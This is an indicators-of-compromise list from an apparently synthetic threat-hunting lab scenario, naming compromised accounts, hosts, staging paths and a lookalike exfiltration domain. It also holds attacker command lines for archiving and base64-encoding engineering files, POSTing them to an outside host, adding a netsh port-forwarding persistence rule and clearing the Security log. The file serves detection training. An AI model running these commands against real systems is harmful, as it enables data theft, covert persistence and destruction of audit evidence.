# Indicators of Compromise — Silent Corridor

> **Lab scope:** all values below are synthetic and belong to the LOG(N) Pacific
> Silent Corridor training scenario. Do not block or search for them on real systems.

Every value comes from my [incident report](report/incident-report.md).

| Type | Value | Context |
|---|---|---|
| Account | `s.brandt` | Compromised; used for initial access |
| Account | `m.richter` | Compromised; WMIC execution, staging, archiving, cleanup |
| Host | `WS-ENG04` | Beachhead workstation |
| Host | `SRV-FILES02` | File staging host |
| Host | `SRV-DC01` (`SRV-DC01.haldric.local`) | Domain controller; ntds.dit accessed, artefacts deleted |
| Domain | `cdn-telemetry.cloud-endpoint.net` | Exfiltration destination (CDN-lookalike) |
| Network | `0.0.0.0:8443` → `SRV-DC01.haldric.local:445` | netsh portproxy persistence listener |
| Directory | `C:\Windows\Temp\McAfee_Logs` | Staging directory disguised as AV logs |
| Directory | `C:\Engineering\Avionics\A400M_NavSys` | Sensitive source data collected |
| File | `ntds.dit` | Active Directory database accessed |
| File | `C:\Windows\Temp\win_update_kb5034.zip` | Archive disguised as a Windows update |
| File | `C:\Windows\Temp\win_update_kb5034.b64` | Base64-encoded archive sent out |
| Process | `WmiPrvSE.exe` (parent) | Receiving side of WMIC remote execution |

## Command lines

| Stage | Command |
|---|---|
| Collection | `powershell Compress-Archive -Path C:\Engineering\Avionics\A400M_NavSys\* -DestinationPath C:\Windows\Temp\win_update_kb5034.zip -Force` |
| Encoding | `certutil -encode C:\Windows\Temp\win_update_kb5034.zip C:\Windows\Temp\win_update_kb5034.b64` |
| Exfiltration | `powershell Invoke-WebRequest -Uri "https://cdn-telemetry.cloud-endpoint.net" -Method POST -InFile "C:\Windows\Temp\win_update_kb5034.b64"` |
| Persistence | `netsh interface portproxy add v4tov4 listenaddress=0.0.0.0 listenport=8443 connectport=445 connectaddress=SRV-DC01.haldric.local` |
| Anti-forensics | `wevtutil cl Security` |

To search for all of these at once, see [queries/09-ioc-sweep.kql](queries/09-ioc-sweep.kql).
